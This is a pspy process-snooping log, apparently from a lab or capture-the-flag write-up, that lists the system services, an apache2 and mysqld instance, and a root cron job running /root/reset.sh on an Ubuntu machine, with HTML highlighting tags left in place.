    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                           
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                            
                   ░           ░ ░                                                                                               
                               ░ ░                                                                                               
                                                                                                                                 
Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span>| Scannning <span class="k">for </span>processes every 100ms and on 
inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>                       
Draining file system events due to startup...                                                                                    <span class="k">done                                                            
</span>2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>9      |                                                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>101  <span class="nv">PID</span><span class="o">=</span>791    | /lib/systemd/systemd-resolved 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>100  <span class="nv">PID</span><span class="o">=</span>785    | /lib/systemd/systemd-networkd                                                     
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>62583 <span class="nv">PID</span><span class="o">=</span>766    | /lib/systemd/systemd-timesyncd                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7      |                                                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>693    |                                                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>690    | bpfilter_umh
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>687    |                                                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>669    |                                                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>637    |                                                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>623    |                                                                                   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>613    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>612    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>611    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>610    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>606    | /lib/systemd/systemd-udevd 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>603    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>6      | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>594    | /sbin/lvmetad <span class="nt">-f</span>  
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>584    | /lib/systemd/systemd-journald 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>583    | /usr/bin/vmtoolsd 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>521    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>520    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>504    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>470    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4164   | <span class="nb">sleep </span>5 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>4114   | ./pspy 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4      | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>399    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>398    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>397    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>387    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>3759   | <span class="nt">-bash</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>3758   | sshd: reader@pts/0   
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>3669   | <span class="o">(</span>sd-pam<span class="o">)</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>3668   | /lib/systemd/systemd <span class="nt">--user</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>3639   | sshd: reader <span class="o">[</span>priv]
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>350    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>349    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>348    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>347    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>346    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>345    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>344    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>343    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>342    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>341    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>340    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>339    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>338    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>337    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>336    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>335    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>334    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>333    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>331    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>3302   | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>330    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>33     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>328    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>327    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>324    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>323    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>322    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>321    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>320    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>319    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>318    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>317    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>316    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>315    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>314    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>313    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>3123   | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>312    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>311    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>310    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>31     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>309    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>3083   | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>308    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>307    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>306    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>305    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>304    |
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>303    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>302    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>301    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>300    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>30     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>3      | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>299    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>298    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>297    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>296    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>295    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>294    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>293    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>292    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>291    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>290    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>29     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>288    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>285    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>28     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>2762   | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>276    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>266    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>265    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>264    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>263    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>262    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>261    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>25     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>24     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>23     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>22     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>211    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>21     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>20     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>2      | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>195    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>191    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>18     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>179    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>177    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>176    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>175    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>174    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>173    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>172    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>171    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>170    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>17     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>169    |
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>168    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>167    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>166    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>165    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>164    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>163    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>162    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>161    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>160    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>16     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>159    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>158    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>157    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>156    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>155    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>154    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>153    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>152    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>151    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>150    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>15     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>149    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>148    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>147    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>146    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>145    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>144    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>143    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>142    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>141    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>140    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>14     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>137    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>136    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>133    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>132    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>131    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>130    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>13     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>129    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>128    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>127    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>126    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>125    | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>12     |
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1197   | /usr/lib/policykit-1/polkitd <span class="nt">--no-debug</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>1168   | /usr/sbin/apache2 <span class="nt">-k</span> start 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>1167   | /usr/sbin/apache2 <span class="nt">-k</span> start 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>1166   | /usr/sbin/apache2 <span class="nt">-k</span> start 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>1165   | /usr/sbin/apache2 <span class="nt">-k</span> start 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>1164   | /usr/sbin/apache2 <span class="nt">-k</span> start 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>111  <span class="nv">PID</span><span class="o">=</span>1163   | /usr/sbin/mysqld <span class="nt">--daemonize</span> <span class="nt">--pid-file</span><span class="o">=</span>/run/mysqld/mysqld.pid 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1160   | /usr/sbin/apache2 <span class="nt">-k</span> start 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1150   | /usr/sbin/sshd <span class="nt">-D</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1126   | /sbin/agetty <span class="nt">-o</span> <span class="nt">-p</span> <span class="nt">--</span> <span class="se">\u</span> <span class="nt">--noclear</span> tty1 linux 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1105   | /usr/lib/snapd/snapd 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1104   | /usr/sbin/irqbalance <span class="nt">--foreground</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1102   | /usr/lib/accountsservice/accounts-daemon 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1101   | /usr/bin/lxcfs /var/lib/lxcfs/ 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>102  <span class="nv">PID</span><span class="o">=</span>1100   | /usr/sbin/rsyslogd <span class="nt">-n</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>11     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1099   | /usr/bin/python3 /usr/bin/networkd-dispatcher <span class="nt">--run-startup-triggers</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1098   | /usr/sbin/atd <span class="nt">-f</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1097   | /usr/bin/VGAuthService 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1096   | /lib/systemd/systemd-logind 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1086   | /bin/sh /root/reset.sh 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1084   | /bin/sh <span class="nt">-c</span> /root/reset.sh 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1070   | /usr/sbin/CRON <span class="nt">-f</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>103  <span class="nv">PID</span><span class="o">=</span>1069   | /usr/bin/dbus-daemon <span class="nt">--system</span> <span class="nt">--address</span><span class="o">=</span>systemd: <span class="nt">--nofork</span> <span class="nt">--nopidfile</span> <span class="nt">--systemd-activation</span> <span class="nt">--syslog-only</span> 
